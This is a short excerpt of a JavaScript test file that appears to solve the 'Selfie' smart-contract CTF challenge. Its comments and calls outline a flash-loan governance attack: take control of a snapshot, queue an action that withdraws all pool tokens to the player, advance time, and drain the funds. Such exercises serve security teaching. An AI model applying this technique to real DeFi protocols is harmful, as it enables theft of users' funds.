...
describe("[Challenge] Selfie", function () {
  ...
  it("Execution", async function () {
    ...
    // get a flash loan to establish control over the last snapshot
    // create a new governance action to withdraw all tokens from the pool to the player
    ...
    await attacker
      .startAttack()
      .then(async () => await ethers.provider.send("evm_increaseTime", [3 * 24 * 60 * 60]))
      .then(async () => await attacker.drainFunds());
  });
